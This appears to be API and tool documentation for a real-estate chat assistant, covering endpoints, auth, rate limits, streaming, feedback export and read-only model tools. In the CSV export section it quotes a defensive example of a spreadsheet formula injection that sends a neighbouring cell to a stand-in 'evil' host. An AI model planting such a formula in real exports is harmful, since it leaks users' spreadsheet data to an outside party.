# Aura Chat — endpoints and tools

Every HTTP route the service serves, and every tool the model may call.
Companion to [schema.md](schema.md) (what is stored) and
[operations.md](operations.md) (how to reach it).

`BASE` is the deployment's origin — `http://localhost:8000` locally, the Railway
URL in production. Getting `$TOK`: [operations.md §1](operations.md).

---

## 1. Endpoints

| Method | Path | Auth | What it is |
|---|---|---|---|
| `POST` | `/login` | none | Portal credentials in, a session token out |
| `GET` | `/health` | none | Liveness, for the platform probe |
| `GET` | `/doctor` | bearer, **unverified allowed** | Full diagnosis |
| `GET` | `/me` | bearer | The verified identity |
| `POST` | `/chat` | bearer | Ask a question; answers as SSE |
| `POST` | `/feedback` | bearer | Report on an answer |
| `GET` | `/feedback` | bearer, **admin** | The report queue |
| `GET` | `/feedback.csv` | bearer, **admin** | The same queue as a spreadsheet |
| `GET` | `/conversations` | bearer | This realtor's threads |
| `GET` | `/conversations/{id}` | bearer | One thread |

Every bearer route takes `Authorization: Bearer <portal session token>` — the
same token the PWA already holds. There is no second credential and no service
account ([invariants.md](invariants.md) 2).

Every response carries **`X-Request-Id`**, a twelve-character id that also
appears on that request's log lines. It is the thing to quote when reporting a
failure. See [§5 of operations.md](operations.md) for where the logs are.

### Ceilings (AUR-21)

| Route | Counted per | Default |
|---|---|---|
| `POST /chat` | user | 60 / hour |
| `POST /login` | client IP | 20 / hour |
| `GET /doctor` | client IP | 30 / hour |

Over the ceiling is `429` with `Retry-After` in seconds — named in
`expose_headers`, so a browser on another origin can actually read it. Raise the
ceilings with `CHAT_PER_HOUR`, `LOGIN_PER_HOUR`, `DOCTOR_PER_HOUR`. The counters
are in memory, per process: **a second replica doubles every number above.**

The IP-keyed ones read the **last** `X-Forwarded-For` entry, which is the one our
own proxy wrote. See [operations.md §2](operations.md) for what that assumes.

---

### `POST /login`

```json
{"user": "harvinder", "password": "…"}
```

→ `200 {"ok": true, "token": "…", "name": "Harvinder Babra", "role": "realtor"}`

`401` with the portal's own wording (which distinguishes a bad password from a
lockout), `502` if the portal did not answer. Nothing is stored or logged here:
the password exists for the length of one outbound request.

### `GET /health`

→ `200 {"status": "ok" | "degraded" | "down", "ok": true}`

Public, so it says whether we are serving — never which secret is missing. The
detail lives behind `/doctor`.

### `GET /doctor?fresh=1`

→ `200` with one entry per check: `app`, `portal_reachable`, `model`,
`portal_auth`, `token_verification`, `project_data`, `conversation_store`,
`document_index`, `data_quality`.

**Answers a caller whose token did not verify**, on purpose — that is the single
most valuable thing it can diagnose, and it is what tells a mismatched
`TOKEN_SECRET` apart from an expired session. Detail is redacted on every check
but those two when the token is unverified.

`?fresh=1` rebuilds the project cache. Slow and rate-limited upstream: it is the
answer to "I edited the sheet, why is Aura still saying the old thing?"

### `GET /me`

→ `200 {"user": "harvinder", "role": "realtor", "admin": false}`

The PWA calls this at sign-in to decide whether to draw the Reports row. It is a
courtesy, not a gate — `/feedback` checks the same claim itself.

### `POST /chat`

```json
{
  "question": "detached under $1M in Brampton",
  "mode": "realtor" | "client",
  "conversation_id": "uuid or null",
  "history": []
}
```

→ `200 text/event-stream`. Each frame is `data: {json}\n\n`:

| `type` | Payload | Meaning |
|---|---|---|
| `start` | `mode`, `conversation_id` | Sent first, always. The mode the server applied. |
| `tool` | `tool`, `args` | A tool is running — this is the status line |
| `tool_result` | `tool`, `count` | How many records it returned |
| `text` | `text` | An answer delta, not the whole answer |
| `projects` | `projects[]` | The records behind the answer, for cards |
| `done` | `usage` | Finished, with token counts |
| `error` | `detail` | Failed. Terminal. |

A stream can end **without** a terminator — a backgrounded phone, a proxy
timeout, a recycled container. A client that treats that as success leaves a
caret blinking under half an answer; treat a missing `done`/`error` as failure.

`mode` is a UI state, not an account property. It selects the `Viewer` here and
nothing downstream trusts the client with it again.

`history` is honoured **only** when there is no `conversation_id`. It exists for
phones that have not updated and will be removed once the rollout completes.

### `POST /feedback`

```json
{
  "answer_id": "…", "question": "…",
  "verdict": "up" | "down" | null,
  "category": "price_incorrect" | … | null,
  "note": "", "project_ids": []
}
```

→ `200 {"ok": true}`. `verdict` is null for a data-issue report: a thumb judges
the answer, a report judges the sheet. A report must say *something* — a verdict,
a category or a note.

Categories: `price_incorrect`, `deposit_incorrect`, `incentive_outdated`,
`occupancy_incorrect`, `missing_project`, `source_outdated`, `other`.

`user` comes from the token, never the body. `answer_id` is client-minted and
opaque — nothing is looked up by it, so a forged one costs a junk row.

### `GET /feedback?limit=100` · `GET /feedback.csv?limit=500` — admin only

→ `200 {"feedback": [ … ]}`, newest first. `403` for a realtor, `503` when the
store is unconfigured or down. The CSV has a fixed column order —
`created_at, user_id, verdict, category, question, note, project_ids` — because
columns that move between exports are columns nobody can build a filter on.

Any cell that would otherwise start with `=`, `+`, `-` or `@` is prefixed with a
single quote. `note` and `question` are typed by a realtor and this file exists
to be pasted into Sheets, so an unquoted `=HYPERLINK("https://evil/?x"&A1,…)`
would arrive as a live link carrying the neighbouring cell into a URL. The quote
is consumed on display — the reviewer sees what was typed.

### `GET /conversations?limit=30`

→ `200 {"conversations": [{"id", "title", "mode", "updated_at"}]}`, newest
first, capped at 50.

### `GET /conversations/{id}`

→ `200 {"conversation_id", "title", "mode", "messages": [{"id", "role",
"message", "sources", "created_at"}]}`, oldest first, up to 200.

`mode` is what the client applies **before** painting anything (AUR-57).
`sources` is `[{"id", "name"}]` — the projects an answer was built from, never
the project records themselves.

**A thread that is not yours returns `404`**, identical to one that never
existed. Telling those apart is itself a disclosure (AUR-40).

`503` — with the same sentence whether the store is unconfigured or unreachable
— means history is gone, not that chat is. Asking still works.

---

## 2. Tools (AUR-89)

Five, in [`app/tools.py`](../../aura-chat/app/tools.py). Plain async functions
over `ProjectRepo`; no framework and no adapter is imported there.

**Read-only by construction** (AUR-19): `ProjectRepo` has no write method, so
there is no write a tool could make.

**Redaction is not a step any tool takes.** The repo they are handed is a
`RedactingProjectRepo` built from the caller's verified claims, so an unredacted
`Project` is not something a tool can obtain — rather than something a tool must
remember to avoid. `tests/test_layering.py` fails if a `for_viewer` ever appears
in this file.

| Tool | Arguments | Reads |
|---|---|---|
| `search_projects` | `city`, `builder`, `categories[]`, `min_price`, `max_price`, `min_bedrooms`, `max_deposit_pct`, `occupancy`, `focus_only`, `query`, `limit` | Matching projects, at most 12 |
| `inventory_summary` | `city`, `builder`, `categories[]`, `focus_only`, `query` | Counts and names over **everything** that matches — no limit, because a truncatable summary is the bug it exists to fix |
| `get_project` | `ref` (id **or** exact name) | One project's current record |
| `compare_projects` | `project_ids[]` | Up to 4 records, side by side |
| `get_recent_projects` | `days`, `limit` | What changed lately, by the sheet's `LAST UPDATED` |

`categories` are the portal's own four buckets: `detached`, `semi`, `townhome`,
`condo`. Anything else matches nothing — see
[known-issues 3](known-issues.md).

`get_project` resolves a **name** as well as an id, because a realtor naming a
project is not handing over an id. An ambiguous name returns nothing, never a
guess: two Brampton projects are both called Mayfield Village, and picking one
produces a confident answer about the wrong builder's deposit schedule.

At most **6 model round trips** per question (`MAX_STEPS`), and at most 1500
output tokens (`LLM_MAX_TOKENS`).
